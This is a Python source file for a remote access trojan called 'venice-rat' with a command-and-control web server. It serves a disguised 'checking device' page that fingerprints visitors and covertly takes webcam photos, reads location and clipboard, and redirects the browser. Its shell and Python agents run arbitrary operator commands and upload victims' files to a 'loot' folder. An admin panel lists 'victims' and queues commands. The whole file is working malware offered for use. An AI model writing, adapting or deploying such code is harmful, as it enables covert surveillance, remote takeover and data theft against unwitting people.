#!/usr/bin/env python3
# venice-rat.py — C2: browser telemetry + shell agents
import base64, json, os, queue, random, secrets, socket, subprocess, sys, threading, time
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

ADMIN = os.environ.get("KEY") or secrets.token_hex(4)
LOOT = os.path.abspath("loot"); os.makedirs(LOOT, exist_ok=True)
DB, SEQ = {}, [0]
POLL = 8
PORT = int(os.environ["PORT"]) if os.environ.get("PORT") else None

def cid():
    SEQ[0] += 1; return str(SEQ[0])

PAGE = r"""<!doctype html><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1">
<title>ok</title><style>body{background:#0b0d10;color:#c9d1d9;font:14px system-ui;padding:18px}
h1{font-size:16px;color:#fff;margin:0 0 6px}#s{color:#3fb950;font-size:12px;margin-bottom:12px}
a{display:block;padding:11px;margin-top:8px;background:#21262d;border:1px solid #30363d;
border-radius:7px;color:#c9d1d9;text-decoration:none;text-align:center}</style>
<h1>checking device</h1><div id=s>connecting…</div>
<a href="/agent.sh">agent.sh</a><a href="/agent.py">agent.py</a>
<a href="/admin?key=__KEY__">panel</a>
<script>
const T=localStorage.getItem("vrt")||(Math.random().toString(36).slice(2)+Date.now().toString(36));
localStorage.setItem("vrt",T);
const P=(p,d)=>fetch(p,{method:"POST",body:JSON.stringify(d)}).catch(()=>{});
(async()=>{
  const i={ua:navigator.userAgent,plat:navigator.platform,screen:screen.width+"x"+screen.height,
    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,cores:navigator.hardwareConcurrency,
    touch:navigator.maxTouchPoints,lang:navigator.language};
  try{const b=await navigator.getBattery();i.battery=Math.round(b.level*100)+"%"}catch(e){}
  await P("/api/register",{token:T,kind:"browser",info:i});
  s.textContent="connected";
  for(;;){try{
    const r=await fetch("/api/poll?t="+T);const x=await r.text();
    if(x.trim()){const l=x.split("\n");await run(l[0],atob(l[1]))}
  }catch(e){await new Promise(r=>setTimeout(r,2000))}}
})();
async function run(id,cmd){
  let o="";const op=cmd.trim().split(/\s+/)[0];
  try{
    if(op==="shot"){const st=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
      const v=document.createElement("video");v.srcObject=st;await v.play();
      await new Promise(r=>setTimeout(r,700));const c=document.createElement("canvas");
      c.width=v.videoWidth;c.height=v.videoHeight;c.getContext("2d").drawImage(v,0,0);
      st.getTracks().forEach(x=>x.stop());
      await P("/api/upload",{token:T,name:"cam"+Date.now()+".jpg",data:c.toDataURL("image/jpeg",.8).split(",")[1]});
      o="photo "+c.width+"x"+c.height}
    else if(op==="loc"){o=await new Promise(r=>navigator.geolocation.getCurrentPosition(
      p=>r(JSON.stringify(p.coords)),e=>r("ERR "+e.message),{timeout:15000}))}
    else if(op==="clip") o=await navigator.clipboard.readText();
    else if(op==="open"){location.href=cmd.slice(5);o="nav"}
    else if(op==="speak"){speechSynthesis.speak(new SpeechSynthesisUtterance(cmd.slice(6)));o="spoken"}
    else o="browser only: shot loc clip open speak";
  }catch(e){o="ERR "+e.message}
  await P("/api/result",{token:T,id,out:btoa(unescape(encodeURIComponent(o)))});
}
</script>"""

AGENT_SH = r"""#!/bin/sh
B="__BASE__"; T="__TOKEN__"; C="$HOME"
jp(){ if command -v curl >/dev/null 2>&1
 then curl -sS -m 30 -H 'Content-Type: application/json' --data-binary "$2" "$B$1" >/dev/null 2>&1
 else wget -q -O /dev/null --post-data="$2" "$B$1" 2>/dev/null; fi; }
gt(){ if command -v curl >/dev/null 2>&1; then curl -s -m 40 "$B$1"; else wget -q -O - "$B$1" 2>/dev/null; fi; }
jp /api/register "{\"token\":\"$T\",\"kind\":\"sh\",\"info\":{\"uname\":\"$(uname -a 2>/dev/null|tr -d '"')\",\"user\":\"$(id -un 2>/dev/null)\"}}"
while :; do
 R=$(gt "/api/poll?t=$T"); [ -z "$R" ] && { sleep 1; continue; }
 I=$(printf '%s\n' "$R"|sed -n 1p); X=$(printf '%s\n' "$R"|sed -n 2p|base64 -d 2>/dev/null)
 [ -z "$I" ] && continue
 case "$X" in
  exit) break;;
  "cd "*) C=$(cd "$C" 2>/dev/null && cd "${X#cd }" 2>/dev/null && pwd); O="cwd $C";;
  "dl "*) F="${X#dl }"; case "$F" in /*);; *) F="$C/$F";; esac
    if [ -f "$F" ]; then jp /api/upload "{\"token\":\"$T\",\"name\":\"$(basename "$F")\",\"data\":\"$(base64 "$F"|tr -d '\n')\"}"; O="sent"; else O="missing $F"; fi;;
  *) O=$(cd "$C" 2>/dev/null; eval "$X" 2>&1);;
 esac
 jp /api/result "{\"token\":\"$T\",\"id\":\"$I\",\"out\":\"$(printf %s "$O"|base64|tr -d '\n')\"}"
done
"""

AGENT_PY = r'''#!/usr/bin/env python3
import base64,getpass,json,os,platform,subprocess,sys,urllib.request
B="__BASE__"; T="__TOKEN__"
def p(u,o):
    try: return urllib.request.urlopen(urllib.request.Request(B+u,data=json.dumps(o).encode(),
        headers={"Content-Type":"application/json"}),timeout=30).read()
    except Exception: return b""
def g(u):
    try: return urllib.request.urlopen(B+u,timeout=40).read()
    except Exception: return b""
p("/api/register",{"token":T,"kind":"py","info":{"uname":platform.platform(),"user":getpass.getuser()}})
c=os.getcwd()
while True:
    r=g("/api/poll?t="+T).decode()
    if not r.strip(): continue
    l=r.split("\n"); i=l[0]; x=base64.b64decode(l[1]).decode()
    if x.strip()=="exit": break
    if x.startswith("cd "):
        try: os.chdir(os.path.expanduser(x[3:].strip())); c=os.getcwd(); o="cwd "+c
        except Exception as e: o="ERR %s"%e
    elif x.startswith("dl "):
        try: p("/api/upload",{"token":T,"name":os.path.basename(x[3:].strip()),
            "data":base64.b64encode(open(x[3:].strip(),"rb").read()).decode()}); o="sent"
        except Exception as e: o="ERR %s"%e
    else:
        try:
            q=subprocess.run(x,shell=True,cwd=c,capture_output=True,text=True,timeout=180)
            o=(q.stdout+q.stderr) or "(no output)"
        except Exception as e: o="ERR %s"%e
    p("/api/result",{"token":T,"id":i,"out":base64.b64encode(o.encode()).decode()})
'''

ADMIN_PAGE = r"""<!doctype html><meta charset=utf-8><title>panel</title><style>
*{box-sizing:border-box}body{margin:0;background:#0b0d10;color:#c9d1d9;font:13px monospace;display:flex;height:100vh}
#l{width:210px;border-right:1px solid #21262d;overflow:auto;flex:none}
.d{padding:8px;border-bottom:1px solid #161b22;cursor:pointer;font-size:12px}
.d.on{background:#1f6feb33}#l h2{font-size:10px;color:#7d8590;padding:8px;margin:0}
#r{flex:1;display:flex;flex-direction:column;min-width:0}
#o{flex:1;overflow:auto;padding:10px;white-space:pre-wrap;font-size:12px}
#inf{padding:8px;font-size:11px;color:#8b949e;border-bottom:1px solid #21262d;white-space:pre-wrap;max-height:30vh;overflow:auto}
#f{display:flex;gap:6px;padding:8px;border-top:1px solid #21262d}
#i{flex:1;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:8px;border-radius:6px;font:inherit;outline:0}
button{background:#21262d;border:1px solid #30363d;color:#c9d1d9;padding:8px 12px;border-radius:6px;font:inherit}
</style><div id=l><h2>victims <span id=n>0</span></h2><div id=list></div></div>
<div id=r><div id=inf>pick one</div><div id=o></div>
<div id=f><input id=i placeholder="shot / loc / ls" autocomplete=off><button id=b>run</button></div></div>
<script>
const K="__KEY__";let cur=null,seen=0,t=null;
const d64=s=>{try{return new TextDecoder().decode(Uint8Array.from(atob(s),c=>c.charCodeAt(0)))}catch(e){return"?b"}};
const ln=(x,c)=>{const e=document.createElement("div");e.textContent=x;if(c)e.style.color=c;o.appendChild(e);o.scrollTop=o.scrollHeight};
async function load(){
 const r=await fetch("/api/devices?key="+K).then(x=>x.json()).catch(()=>[]);
 n.textContent=r.length;list.innerHTML="";
 r.forEach(v=>{const e=document.createElement("div");e.className="d"+(v.token===cur?" on":"");
  e.textContent=v.kind+" · "+(v.online?"on":"off")+" · "+v.ip;e.onclick=()=>pick(v.token);list.appendChild(e)});
 if(!cur&&r.length)pick(r[0].token);
}
async function pick(tk){cur=tk;o.innerHTML="";
 const d=await fetch("/api/device?key="+K+"&t="+tk).then(x=>x.json()).catch(()=>({}));
 inf.textContent=(d.online?"ONLINE":"offline")+" · "+d.ip+"\n"+JSON.stringify(d.info,null,1);
 seen=d.on||0;clearInterval(t);t=setInterval(tick,1200)}
async function tick(){
 const r=await fetch("/api/out?key="+K+"&t="+cur+"&after="+seen).then(x=>x.json()).catch(()=>({items:[]}));
 (r.items||[]).forEach(x=>{seen=x.n+1;ln(d64(x.out))});
}
document.getElementById("b").onclick=async()=>{
 const c=i.value.trim();if(!c||!cur)return;ln("$ "+c,"#58a6ff");i.value="";
 const r=await fetch("/api/exec",{method:"POST",headers:{"Content-Type":"application/json"},
  body:JSON.stringify({key:K,token:cur,cmd:c})}).then(x=>x.json()).catch(()=>({}));
 ln(r.ok?"queued":"fail: "+r.err,"#d29922")};
i.onkeydown=e=>{if(e.key==="Enter")document.getElementById("b").click()};
load();setInterval(load,3000);
</script>"""

class H(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    def log_message(self, *a): pass
    def s(self, b, ct="text/plain", code=200):
        if isinstance(b, str): b = b.encode()
        self.send_response(code); self.send_header("Content-Type", ct)
        self.send_header("Content-Length", str(len(b))); self.send_header("Connection", "close")
        self.end_headers()
        try: self.wfile.write(b)
        except Exception: pass
    def j(self, o, code=200): self.s(json.dumps(o), "application/json", code)
    def b(self):
        n = int(self.headers.get("Content-Length") or 0)
        if n <= 0: return {}
        try: return json.loads(self.rfile.read(n))
        except Exception: return {}
    def host(self):
        pub = os.environ.get("RENDER_EXTERNAL_URL")
        if pub: return pub.rstrip("/")
        return "http://" + self.headers.get("Host", "127.0.0.1")

    def do_GET(self):
        u = urlparse(self.path); q = parse_qs(u.query); p = u.path
        if p == "/": return self.s(PAGE.replace("__KEY__", ADMIN), "text/html")
        if p == "/admin":
            if q.get("key", [""])[0] != ADMIN: return self.s("bad key", code=403)
            return self.s(ADMIN_PAGE.replace("__KEY__", ADMIN), "text/html")
        if p == "/agent.sh":
            return self.s(AGENT_SH.replace("__BASE__", self.host()).replace("__TOKEN__", secrets.token_hex(5)))
        if p == "/agent.py":
            return self.s(AGENT_PY.replace("__BASE__", self.host()).replace("__TOKEN__", secrets.token_hex(5)))
        if p == "/api/poll":
            d = DB.get(q.get("t", [""])[0])
            if not d: return self.s("")
            d["seen"] = time.time()
            try: it = d["q"].get(timeout=POLL)
            except queue.Empty: return self.s("")
            return self.s("%s\n%s" % (it["id"], it["b64"]))
        if p == "/api/device":
            d = DB.get(q.get("t", [""])[0])
            if not d: return self.j({})
            return self.j({"online": time.time() - d["seen"] < 40, "ip": d["ip"],
                           "info": d["info"], "on": d["on"]})
        if p == "/api/devices":
            if q.get("key", [""])[0] != ADMIN: return self.j([])
            return self.j([{"token": t, "kind": d["kind"], "ip": d["ip"],
                            "online": time.time() - d["seen"] < 40} for t, d in DB.items()])
        if p == "/api/out":
            d = DB.get(q.get("t", [""])[0])
            if not d: return self.j({"items": []})
            a = int(q.get("after", ["0"])[0])
            return self.j({"items": [x for x in d["out"] if x["n"] >= a]})
        if p == "/api/file":
            d = DB.get(q.get("t", [""])[0]); nm = q.get("name", [""])[0]
            if not d or not nm: return self.s("nope", code=404)
            fp = os.path.join(LOOT, d["token"], os.path.basename(nm))
            if not os.path.isfile(fp): return self.s("nope", code=404)
            return self.s(open(fp, "rb").read(), "application/octet-stream")
        self.s("nope", code=404)

    def do_POST(self):
        p = urlparse(self.path).path; b = self.b()
        if p == "/api/register":
            tk = b.get("token") or secrets.token_hex(5)
            d = DB.setdefault(tk, {"token": tk, "q": queue.Queue(), "out": [], "info": {},
                                   "on": 0, "ip": "", "seen": 0, "kind": "?"})
            d["kind"] = b.get("kind", "?"); d["ip"] = self.client_address[0]
            d["info"].update(b.get("info") or {}); d["seen"] = time.time()
            return self.j({"ok": True})
        if p == "/api/exec":
            if b.get("key") != ADMIN: return self.j({"ok": False, "err": "key"}, 403)
            d = DB.get(b.get("token", ""))
            if not d: return self.j({"ok": False, "err": "gone"}, 404)
            d["q"].put({"id": cid(), "b64": base64.b64encode(b.get("cmd", "").encode()).decode()})
            return self.j({"ok": True})
        if p == "/api/result":
            d = DB.get(b.get("token", ""))
            if not d: return self.j({})
            d["out"].append({"n": d["on"], "out": b.get("out", "")}); d["on"] += 1
            d["seen"] = time.time(); d["out"][:] = d["out"][-500:]
            return self.j({"ok": True})
        if p == "/api/upload":
            d = DB.get(b.get("token", ""))
            if not d: return self.j({})
            nm = os.path.basename(b.get("name") or "f")
            os.makedirs(os.path.join(LOOT, d["token"]), exist_ok=True)
            raw = base64.b64decode((b.get("data") or "").split(",")[-1] or b"")
            open(os.path.join(LOOT, d["token"], nm), "wb").write(raw)
            d["out"].append({"n": d["on"], "out": base64.b64encode(("saved "+nm).encode()).decode()})
            d["on"] += 1
            return self.j({"ok": True})
        self.s("nope", code=404)

if __name__ == "__main__":
    srv = None
    base = PORT or random.randint(8400, 8999)
    for i in range(200):
        try:
            srv = ThreadingHTTPServer(("0.0.0.0", base + i), H, bind_and_activate=False)
            srv.server_bind(); srv.server_activate(); break
        except OSError: srv = None
    if not srv: raise SystemExit("no free port")
    pub = os.environ.get("RENDER_EXTERNAL_URL")
    print("up on port %d" % (base))
    print("panel: %s/admin?key=%s" % (pub or "http://127.0.0.1:%d" % base, ADMIN))
    try: srv.serve_forever()
    except KeyboardInterrupt: pass
